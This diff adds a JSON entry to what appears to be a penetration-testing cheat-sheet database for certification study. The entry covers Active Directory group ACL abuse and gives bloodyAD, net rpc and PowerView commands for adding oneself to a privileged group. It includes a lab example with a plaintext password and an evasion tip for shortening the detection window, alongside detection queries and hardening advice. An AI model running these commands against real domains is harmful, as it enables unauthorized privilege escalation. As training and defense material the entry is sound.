@@ -1,0 +1,103 @@
+{
+  "id": "ad-genericall-group",
+  "name": "GenericAll / GenericWrite on a Group (Add Member)",
+  "command": "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <password> add groupMember \"<target_group>\" <user>",
+  "description": "With GenericAll, GenericWrite, WriteProperty (member), or AddMember over a group, add a principal you control to that group to inherit its rights. Re-authenticate afterward so the new group membership appears in your Kerberos ticket. Common privilege-escalation edge in BloodHound.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Active Directory",
+  "subcategory": "ACL Abuse",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "HTB Fluffy engagement; BloodHound ACL abuse",
+  "tags": [
+    "genericall",
+    "genericwrite",
+    "group",
+    "add-member",
+    "acl-abuse",
+    "bloodyad"
+  ],
+  "mitre": [
+    "T1098"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THE EDGE ===\nBloodHound shows GenericAll / GenericWrite / AddSelf / WriteProperty(member) from a\nprincipal you control to a group. Adding a member is the simplest abuse.\n\n=== RE-AUTH IS REQUIRED ===\nGroup membership is baked into your Kerberos TGT at logon. After adding yourself you\nMUST get a fresh ticket for the new membership to take effect:\n  - Linux: request a new TGT (getTGT.py) or re-run the tool with fresh creds.\n  - Windows: log off/on, or klist purge then request a new ticket.\n\n=== TOOLING OPTIONS ===\n  bloodyAD:  add groupMember \"<target_group>\" <user>\n  net rpc:   net rpc group addmem \"<target_group>\" <user> -U '<domain>/<user>%<password>' -S <dc_ip>\n  PowerView: Add-DomainGroupMember -Identity '<target_group>' -Members <user>\n  AD module: Add-ADGroupMember -Identity '<target_group>' -Members <user>\n\n=== CLEANUP ===\nRemove yourself when done: bloodyAD ... remove groupMember \"<target_group>\" <user>",
+  "examples": [
+    {
+      "label": "bloodyAD - add self to a group",
+      "command": "bloodyAD --host 10.129.65.243 -d fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' add groupMember \"Service Account Managers\" j.fleischman"
+    },
+    {
+      "label": "net rpc - add member",
+      "command": "net rpc group addmem \"<target_group>\" <user> -U '<domain>/<user>%<password>' -S <dc_ip>"
+    },
+    {
+      "label": "Remove self after abuse (cleanup)",
+      "command": "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <password> remove groupMember \"<target_group>\" <user>"
+    }
+  ],
+  "references": [
+    {
+      "title": "bloodyAD",
+      "url": "https://github.com/CravateRouge/bloodyAD"
+    },
+    {
+      "title": "The Hacker Recipes - ACL abuse",
+      "url": "https://www.thehacker.recipes/ad/movement/dacl"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-shadow-credentials",
+      "note": "The group may grant write over accounts - then use Shadow Credentials.",
+      "rel": "next"
+    },
+    {
+      "id": "ad-force-change-password",
+      "note": "If the group grants reset rights over a user, force-change its password.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "The attacker holds an ACE (GenericAll/GenericWrite/WriteProperty member/Self-AddMember) over a group object, so the DC permits them to write the group's member attribute and add an arbitrary principal, inheriting the group's access.",
+    "prerequisites": "Write access to a group's membership (from an over-permissive ACL or nested ownership) and the ability to re-authenticate for a fresh ticket.",
+    "impact": "Privilege escalation to whatever the target group grants (data access, further ACLs, or Tier-0 membership).",
+    "detection": "[MITRE T1098] Event 4728 (member added to a global security group), 4732 (local), or 4756 (universal); Event 5136 modifying the group's member attribute; correlate with an actor who is not a normal group administrator.",
+    "artifacts": "4728/4732/4756 group-membership-change events; 5136 on the group's member attribute; the transient membership if cleaned up.",
+    "splunk_spl": "index=wineventlog sourcetype=\"WinEventLog:Security\" (EventCode=4728 OR EventCode=4732 OR EventCode=4756)\n| table _time, SubjectUserName, MemberName, TargetUserName, GroupName\n| sort - _time\n\nindex=wineventlog sourcetype=\"WinEventLog:Security\" EventCode=5136 AttributeLDAPDisplayName=\"member\"\n| table _time, SubjectUserName, ObjectDN, OperationType",
+    "elastic_kql": "event.code:(\"4728\" OR \"4732\" OR \"4756\")",
+    "sentinel_kql": "SecurityEvent\n| where EventID in (4728, 4732, 4756)\n| project TimeGenerated, Actor=SubjectUserName, MemberAdded=MemberName, Group=TargetUserName\n| sort by TimeGenerated desc",
+    "sigma_rules": "win_security_group_membership_change, win_security_member_added_sensitive_group",
+    "prevention": "Review and minimize ACLs on privileged groups (remove GenericAll/GenericWrite held by non-admins); alert on membership changes to sensitive groups (4728/4732/4756); use Protected Users / tiered admin; enable directory-service auditing for the member attribute.",
+    "evasion": "Add then quickly remove the membership after use to shorten the window; target a low-visibility group rather than Domain Admins directly.",
+    "sources": [
+      "HTB Fluffy",
+      "MITRE T1098"
+    ],
+    "misconfiguration": "Non-administrative or service principals hold write access over group membership (GenericAll/GenericWrite/WriteProperty member), often from legacy delegation or nested group ownership.",
+    "vulnerable_config": "# BloodHound: GenericAll/GenericWrite/AddMember edge to a group.\nGet-DomainObjectAcl -Identity '<target_group>' -ResolveGUIDs |\n  ? { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteProperty|Self' }",
+    "secure_config": "# Remove the excessive ACE from the group (example with dsacls):\ndsacls \"CN=<target_group>,OU=Groups,DC=<domain>\" /R \"<domain>\\<over_privileged_principal>\"\n# Then monitor 4728/4732/4756 on sensitive groups and require change control for membership."
+  },
+  "tools": [
+    "bloodyAD",
+    "impacket",
+    "PowerView"
+  ],
+  "interview": [
+    {
+      "q": "You have GenericAll over a group in BloodHound. How do you abuse it and what is the gotcha?",
+      "a": "Add a principal you control to the group (bloodyAD add groupMember, net rpc group addmem, or Add-DomainGroupMember). The gotcha is that group membership lives in your Kerberos ticket, so you must re-authenticate (new TGT / logoff-logon) before the new rights take effect.",
+      "role": "both"
+    },
+    {
+      "q": "Which Windows events reveal this, and how would you separate malicious from routine changes?",
+      "a": "4728/4732/4756 (member added to a security group) and 5136 on the member attribute. Separate malicious from routine by the actor (not a normal group admin), timing, and correlation with prior recon or a fresh logon by the added principal.",
+      "role": "soc"
+    }
+  ]
+}
